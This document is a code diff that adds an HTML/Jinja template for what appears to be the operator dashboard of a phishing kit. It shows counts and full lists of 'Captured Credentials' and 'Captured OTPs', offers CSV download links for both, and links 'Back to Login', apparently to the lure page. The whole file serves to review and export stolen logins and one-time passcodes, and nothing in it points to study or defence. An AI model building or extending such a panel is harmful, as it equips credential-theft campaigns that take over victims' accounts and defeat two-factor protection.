@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - Premium</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+          },
+          animation: {
+            'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+    .animate-in {
+      animation: fadeIn 0.5s ease-out forwards;
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    .btn-gradient {
+      background-size: 200% 200%;
+      animation: gradientShift 3s ease infinite;
+    }
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .scrollbar-thin::-webkit-scrollbar {
+      width: 4px;
+    }
+    .scrollbar-thin::-webkit-scrollbar-track {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+    }
+    .scrollbar-thin::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 10px;
+    }
+    .scrollbar-thin::-webkit-scrollbar-thumb:hover {
+      background: rgba(255, 255, 255, 0.3);
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gradient-to-b from-neutral-950 to-neutral-900 text-white p-4 md:p-6">
+  <div class="max-w-6xl mx-auto relative">
+    <!-- Decorative elements -->
+    <div class="fixed -left-20 -top-20 h-40 w-40 rounded-full bg-gradient-to-r from-amber-300/20 to-rose-300/20 blur-3xl"></div>
+    <div class="fixed -bottom-20 -right-20 h-40 w-40 rounded-full bg-gradient-to-r from-emerald-300/20 to-cyan-300/20 blur-3xl"></div>
+
+    <!-- Header -->
+    <header class="animate-in mb-8">
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
+        <div class="flex items-center gap-3">
+          <div class="h-10 w-10 rounded-full bg-gradient-to-r from-rose-500 to-amber-500 flex items-center justify-center shadow-lg">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 4.5a2.5 2.5 0 0 0-4.96-.46 2.5 2.5 0 0 0-1.98 3 2.5 2.5 0 0 0-1.32 4.24 3 3 0 0 0 .34 5.58 2.5 2.5 0 0 0 2.96 3.08 2.5 2.5 0 0 0 4.91.05L12 20V4.5Z" />
+              <path d="M16 8V5c0-1.1.9-2 2-2" />
+              <path d="M12 13h4" />
+              <path d="M12 18h6a2 2 0 0 1 2 2v1" />
+              <path d="M12 8h8" />
+              <path d="M20.5 8a.5.5 0 1 1-1 0 .5.5 0 0 1 1 0Z" />
+              <path d="M16.5 13a.5.5 0 1 1-1 0 .5.5 0 0 1 1 0Z" />
+              <path d="M20.5 21a.5.5 0 1 1-1 0 .5.5 0 0 1 1 0Z" />
+              <path d="M18.5 21a.5.5 0 1 1-1 0 .5.5 0 0 1 1 0Z" />
+            </svg>
+          </div>
+          <h1 class="text-2xl md:text-3xl font-bold tracking-tight">Admin Dashboard</h1>
+        </div>
+        
+        <div class="flex flex-wrap gap-3">
+          <a href="/download/credentials" class="flex items-center gap-2 px-4 py-2 rounded-lg border border-neutral-800 bg-neutral-900/50 text-neutral-300 hover:bg-neutral-800 hover:text-white transition-colors">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+              <polyline points="7 10 12 15 17 10" />
+              <line x1="12" y1="15" x2="12" y2="3" />
+            </svg>
+            <span>Download Credentials CSV</span>
+          </a>
+          <a href="/download/otps" class="flex items-center gap-2 px-4 py-2 rounded-lg border border-neutral-800 bg-neutral-900/50 text-neutral-300 hover:bg-neutral-800 hover:text-white transition-colors">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+              <polyline points="7 10 12 15 17 10" />
+              <line x1="12" y1="15" x2="12" y2="3" />
+            </svg>
+            <span>Download OTP CSV</span>
+          </a>
+        </div>
+      </div>
+
+      <!-- Stats Cards -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+        <div class="animate-in bg-black/40 backdrop-blur-xl rounded-xl p-4 border-0 shadow-xl">
+          <div class="flex items-center justify-between">
+            <h3 class="text-neutral-400 text-sm font-medium">Total Attempts</h3>
+            <div class="h-8 w-8 rounded-full bg-amber-500/20 flex items-center justify-center">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-amber-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
+                <circle cx="9" cy="7" r="4" />
+                <path d="M22 21v-2a4 4 0 0 0-3-3.87" />
+                <path d="M16 3.13a4 4 0 0 1 0 7.75" />
+              </svg>
+            </div>
+          </div>
+          <p class="text-2xl font-semibold mt-2">{{ total_attempts }}</p>
+        </div>
+        
+        <div class="animate-in [animation-delay:100ms] bg-black/40 backdrop-blur-xl rounded-xl p-4 border-0 shadow-xl">
+          <div class="flex items-center justify-between">
+            <h3 class="text-neutral-400 text-sm font-medium">Credentials Captured</h3>
+            <div class="h-8 w-8 rounded-full bg-rose-500/20 flex items-center justify-center">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-rose-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
+                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+              </svg>
+            </div>
+          </div>
+          <p class="text-2xl font-semibold mt-2">{{ total_credentials }}</p>
+        </div>
+        
+        <div class="animate-in [animation-delay:200ms] bg-black/40 backdrop-blur-xl rounded-xl p-4 border-0 shadow-xl">
+          <div class="flex items-center justify-between">
+            <h3 class="text-neutral-400 text-sm font-medium">OTPs Captured</h3>
+            <div class="h-8 w-8 rounded-full bg-emerald-500/20 flex items-center justify-center">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-emerald-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect width="18" height="18" x="3" y="3" rx="2" ry="2" />
+                <circle cx="8.5" cy="8.5" r="1.5" />
+                <circle cx="15.5" cy="8.5" r="1.5" />
+                <circle cx="15.5" cy="15.5" r="1.5" />
+                <circle cx="8.5" cy="15.5" r="1.5" />
+              </svg>
+            </div>
+          </div>
+          <p class="text-2xl font-semibold mt-2">{{ total_otps }}</p>
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+      <!-- Captured Credentials -->
+      <section class="animate-in [animation-delay:300ms] bg-black/40 backdrop-blur-xl rounded-xl border-0 shadow-xl overflow-hidden">
+        <div class="p-4 border-b border-neutral-800">
+          <div class="flex items-center justify-between">
+            <h2 class="text-xl font-semibold">Captured Credentials</h2>
+            <span class="px-2 py-1 text-xs font-medium rounded-full bg-rose-500/20 text-rose-400">
+  {{ total_credentials }} entries
+</span>
+          </div>
+        </div>
+        
+        <div class="p-4 max-h-[400px] overflow-y-auto scrollbar-thin">
+          {% if creds %}
+            <ul class="space-y-2">
+              {% for line in creds %}
+                <li class="p-3 rounded-lg bg-neutral-800/50 font-mono text-sm break-all">{{ line }}</li>
+              {% endfor %}
+            </ul>
+          {% else %}
+            <div class="flex flex-col items-center justify-center py-8 text-center">
+              <div class="h-12 w-12 rounded-full bg-neutral-800/50 flex items-center justify-center mb-3">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-neutral-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                </svg>
+              </div>
+              <p class="text-neutral-400">No credentials captured yet.</p>
+            </div>
+          {% endif %}
+        </div>
+      </section>
+
+      <!-- Captured OTPs -->
+      <section class="animate-in [animation-delay:400ms] bg-black/40 backdrop-blur-xl rounded-xl border-0 shadow-xl overflow-hidden">
+        <div class="p-4 border-b border-neutral-800">
+          <div class="flex items-center justify-between">
+            <h2 class="text-xl font-semibold">Captured OTPs</h2>
+            <span class="px-2 py-1 text-xs font-medium rounded-full bg-emerald-500/20 text-emerald-400">
+  {{ total_otps }} entries
+</span>
+          </div>
+        </div>
+        
+        <div class="p-4 max-h-[400px] overflow-y-auto scrollbar-thin">
+          {% if otps %}
+            <ul class="space-y-2">
+              {% for line in otps %}
+                <li class="p-3 rounded-lg bg-neutral-800/50 font-mono text-sm break-all">{{ line }}</li>
+              {% endfor %}
+            </ul>
+          {% else %}
+            <div class="flex flex-col items-center justify-center py-8 text-center">
+              <div class="h-12 w-12 rounded-full bg-neutral-800/50 flex items-center justify-center mb-3">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-neutral-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <rect width="18" height="18" x="3" y="3" rx="2" ry="2" />
+                  <circle cx="8.5" cy="8.5" r="1.5" />
+                  <circle cx="15.5" cy="8.5" r="1.5" />
+                  <circle cx="15.5" cy="15.5" r="1.5" />
+                  <circle cx="8.5" cy="15.5" r="1.5" />
+                </svg>
+              </div>
+              <p class="text-neutral-400">No OTP entries yet.</p>
+            </div>
+          {% endif %}
+        </div>
+      </section>
+  </div>
+    <!-- Footer -->
+    <footer class="mt-8 w-full flex justify-center">
+  <a
+    href="/"
+    class="inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-gradient-to-r from-rose-500 to-amber-500 text-white hover:from-rose-600 hover:to-amber-600 transition-all duration-300"
+  >
+    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="m12 19-7-7 7-7" />
+      <path d="M19 12H5" />
+    </svg>
+    <span>Back to Login</span>
+  </a>
+</footer>
+
+
+
+</body>
+</html>
